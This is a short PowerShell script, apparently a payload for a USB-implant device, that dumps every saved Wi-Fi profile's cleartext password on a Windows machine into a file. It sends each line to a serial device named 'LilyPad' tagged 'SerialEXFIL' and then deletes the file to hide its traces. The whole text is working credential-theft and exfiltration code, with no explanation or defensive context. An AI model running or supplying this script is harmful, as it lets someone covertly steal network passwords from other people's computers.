(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File passwords

$portList = get-pnpdevice -class Ports -ea 0
if ($portList) {
	foreach($device in $portList) {
		if ($device.Present -and $device.Name.indexOf("LilyPad") -gt -1) {
			$com=[regex]::match($device.Name,'\(([^\)]+)\)').Groups[1].Value
		}
	}
}

$port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; 
$port.open();
$port.WriteLine("SerialEXFIL:#### New Entry ####"); 
foreach($line in Get-Content .\passwords) {
	$port.WriteLine("SerialEXFIL:$line"); 
}
$port.Close();

rm .\passwords
